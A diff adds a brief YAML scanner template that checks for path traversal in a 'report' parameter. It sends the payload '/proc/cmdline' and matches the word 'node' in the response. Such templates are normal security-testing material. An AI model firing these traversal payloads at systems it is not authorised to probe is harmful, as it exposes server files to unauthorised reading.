@@ -1,0 +1,20 @@
+id: lfi6-1347
+name: 'Traversal in report'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via report'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      report:
+        - '/proc/cmdline'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'node'
